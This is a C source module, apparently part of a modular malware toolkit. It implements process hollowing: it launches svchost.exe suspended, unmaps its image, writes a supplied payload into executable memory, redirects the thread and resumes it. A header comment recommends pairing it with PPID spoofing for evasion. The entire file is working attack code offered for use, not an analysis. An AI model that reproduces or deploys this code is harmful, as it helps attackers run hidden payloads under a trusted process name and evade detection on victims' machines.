// chunk: arch/process_hollow
// depends: (none)
// provides: process_hollow
// headers: windows.h
// risk: high
// note: Process hollowing — create suspended legitimate process, unmap its image, map payload in its place, resume. Classic technique but still effective when combined with PPID spoofing.

#ifndef CHUNK_PROCESS_HOLLOW
#define CHUNK_PROCESS_HOLLOW

typedef NTSTATUS (NTAPI *pfnNtUnmapViewOfSection)(HANDLE, PVOID);
typedef NTSTATUS (NTAPI *pfnNtQueryInformationProcess)(HANDLE, ULONG, PVOID, ULONG, PULONG);

static int process_hollow(BYTE *payload, DWORD payload_size) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return 0;

    pfnNtUnmapViewOfSection pNtUnmap = (pfnNtUnmapViewOfSection)GetProcAddress(ntdll, "NtUnmapViewOfSection");
    pfnNtQueryInformationProcess pNtQueryInfo = (pfnNtQueryInformationProcess)GetProcAddress(ntdll, "NtQueryInformationProcess");
    if (!pNtUnmap || !pNtQueryInfo) return 0;

    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    memset(&pi, 0, sizeof(pi));

    char target[] = "C:\\Windows\\System32\\svchost.exe";
    if (!CreateProcessA(NULL, target, NULL, NULL, FALSE,
                        CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
        return 0;

    // Get PEB address to find image base
    BYTE pbi[48];
    ULONG ret_len = 0;
    pNtQueryInfo(pi.hProcess, 0, pbi, sizeof(pbi), &ret_len);

    // PBI.PebBaseAddress is at offset 8 on x64
    PVOID peb_addr = *(PVOID *)(pbi + 8);

    // Read ImageBaseAddress from PEB (offset 0x10 on x64)
    PVOID image_base = NULL;
    ReadProcessMemory(pi.hProcess, (BYTE *)peb_addr + 0x10, &image_base, sizeof(image_base), NULL);

    // Unmap the original image
    pNtUnmap(pi.hProcess, image_base);

    // Allocate memory at the same base
    LPVOID new_base = VirtualAllocEx(pi.hProcess, image_base, payload_size,
                                      MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!new_base) {
        new_base = VirtualAllocEx(pi.hProcess, NULL, payload_size,
                                   MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!new_base) {
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return 0;
        }
    }

    // Write payload
    SIZE_T written;
    WriteProcessMemory(pi.hProcess, new_base, payload, payload_size, &written);

    // Update PEB.ImageBaseAddress
    WriteProcessMemory(pi.hProcess, (BYTE *)peb_addr + 0x10, &new_base, sizeof(new_base), NULL);

    // Update thread context to point to payload entry
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &ctx);
#ifdef _WIN64
    ctx.Rcx = (DWORD64)new_base;
#else
    ctx.Eax = (DWORD)new_base;
#endif
    SetThreadContext(pi.hThread, &ctx);

    ResumeThread(pi.hThread);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return 1;
}

#endif
